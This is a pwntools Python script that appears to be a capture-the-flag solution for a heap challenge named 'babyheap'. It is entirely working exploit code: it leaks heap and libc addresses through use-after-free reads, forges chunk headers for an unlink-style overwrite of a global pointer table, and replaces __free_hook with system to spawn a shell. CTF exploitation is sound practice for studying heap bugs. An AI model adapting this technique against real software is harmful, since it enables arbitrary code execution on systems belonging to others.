from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("./babyheap")
elf=ELF("/lib/x86_64-linux-gnu/libc-2.19.so")

__free_hook = 0x3c4a10
system = 0x46590

def g():
    gdb.attach(p)
    raw_input()

def Add(index, data):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.send(data)

def Edit(index, data):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.send(data)

def Show(index):
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('Choice:')
    p.sendline('4')
    p.recvuntil('Index:')
    p.sendline(str(index))



Add(0,'AAAAAAAA\n')
Add(1,'BBBBBBBB\n')

Delete(1)
Delete(0)

Show(0)
heap_addr = u64(p.recvline()[ : -1].ljust(8, '\x00')) - 0x30

Edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))

Add(6, "aaa" + '\n')
Add(7, p64(0) + p64(0xa1) + '\n')

Add(2,'CCCCCCCC\n')
Add(3,'DDDDDDDD\n')

Add(4, p64(0) + p64(0x31) + p64(0x602080 - 0x18) + p64(0x602080 - 0x10))
Add(5, p64(0x30) + p64(0x30) + '\n')


Delete(1)
Show(1)
libc_address = u64(p.recvline()[ : -1].ljust(8, '\x00'))-0x3c27b8


Edit(4,p64(libc_address + __free_hook) + '\n')
Edit(1, p64(libc_address + system)+ '\n')

Add(8,"/bin/sh\x00"+'\n')
Delete(8)

p.interactive()
